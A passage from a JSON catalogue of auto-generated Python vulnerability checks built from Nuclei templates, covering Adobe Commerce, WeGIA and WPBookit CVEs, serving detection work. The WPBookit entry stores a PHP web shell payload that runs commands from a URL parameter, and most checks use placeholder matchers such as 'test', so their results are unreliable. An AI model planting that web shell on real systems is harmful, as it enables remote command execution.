        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-54236\nName: Adobe Commerce - Authentication Bypass\nSeverity: critical\nDescription: Adobe Commerce versions 2.4.9-alpha2, 2.4.8-p2, 2.4.7-p7, 2.4.6-p12, 2.4.5-p14, 2.4.4-p15 and earlier are affected by an Improper Input Validation vulnerability. A successful attacker can abuse this to achieve session takeover, increasing the confidentiality, and integrity impact to high. Exploitation of this issue does not require user interaction.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_54236:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-54236\"\n    SEVERITY = \"critical\"\n    NAME = \"Adobe Commerce - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Adobe Commerce - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_54236(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-54236\nName: Adobe Commerce - Authentication Bypass\nSeverity: critical\nDescription: Adobe Commerce versions 2.4.9-alpha2, 2.4.8-p2, 2.4.7-p7, 2.4.6-p12, 2.4.5-p14, 2.4.4-p15 and earlier are affected by an Improper Input Validation vulnerability. A successful attacker can abuse this to achieve session takeover, increasing the confidentiality, and integrity impact to high. Exploitation of this issue does not require user interaction.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_54236:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-54236\"\n    SEVERITY = \"critical\"\n    NAME = \"Adobe Commerce - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Adobe Commerce - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_54236(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "file-upload",
          "intrusive",
          "auth-bypass",
          "kev",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_55169",
        "name": "WeGIA - Directory Traversal",
        "language": "Python",
        "famille": "CVE",
        "description": "WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. Prior to version 3.4.8, a path traversal vulnerability was discovered in the WeGIA application, html/socio/sistema/download_remessa.php endpoint. This vulnerability could allow an attacker to gain unauthorized access to local files in the server and sensitive information stored in config.php. config.php contains information that could allow direct access to the database. This issue has been patched in version 3.4.8.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'DB_PASSWORD' | mot(s) 'application/octet-stream' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-55169\nName: WeGIA - Directory Traversal\nSeverity: critical\nDescription: WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. Prior to version 3.4.8, a path traversal vulnerability was discovered in the WeGIA application, html/socio/sistema/download_remessa.php endpoint. This vulnerability could allow an attacker to gain unauthorized access to local files in the server and sensitive information stored in config.php. config.php contains information that could allow direct access to the database. This issue has been patched in version 3.4.8.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_55169:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-55169\"\n    SEVERITY = \"critical\"\n    NAME = \"WeGIA - Directory Traversal\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DB_PASSWORD' | mot(s) 'application/octet-stream' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DB_PASSWORD', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WeGIA - Directory Traversal\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_55169(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-55169\nName: WeGIA - Directory Traversal\nSeverity: critical\nDescription: WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. Prior to version 3.4.8, a path traversal vulnerability was discovered in the WeGIA application, html/socio/sistema/download_remessa.php endpoint. This vulnerability could allow an attacker to gain unauthorized access to local files in the server and sensitive information stored in config.php. config.php contains information that could allow direct access to the database. This issue has been patched in version 3.4.8.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_55169:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-55169\"\n    SEVERITY = \"critical\"\n    NAME = \"WeGIA - Directory Traversal\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DB_PASSWORD' | mot(s) 'application/octet-stream' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DB_PASSWORD', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WeGIA - Directory Traversal\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_55169(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "wegia",
          "lfi",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_6058",
        "name": "WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload",
        "language": "Python",
        "famille": "CVE",
        "description": "The WPBookit plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the image_upload_handle() function hooked via the 'add_booking_type' route in all versions up to, and including, 1.0.4.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(body, \"WPBookit\") / [OR] DSL: status_code == 200; contains_all(body, \"success\",\"status\") / [OR] DSL: status_code == 200; regex(\"uid=\\\\d+\\\\([^)]+\\\\) gid=\\\\d+\\\\([^)]+\\\\) groups=\\\\d+\\\\([^)]+\\\\)\", body)",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "<?php echo \"<br>\"; if(isset($_GET[\"cmd\"])){ echo \"<pre>\"; system($_GET[\"cmd\"]); echo \"</pre>\"; } ?>"
          },
          {
            "name": "cmd",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: cmd",
            "default": "id"
          },
          {
            "name": "month",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: month",
            "default": "{{date_time(\"%Y/%M\")}}"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{to_lower(rand_base(8))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-6058\nName: WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\nSeverity: critical\nDescription: The WPBookit plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the image_upload_handle() function hooked via the 'add_booking_type' route in all versions up to, and including, 1.0.4.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_6058:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-6058\"\n    SEVERITY = \"critical\"\n    NAME = \"WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"WPBookit\") / [OR] DSL: status_code == 200; contains_all(body, \"success\",\"status\") / [OR] DSL: status_code == 200; regex(\"uid=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\) groups=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def 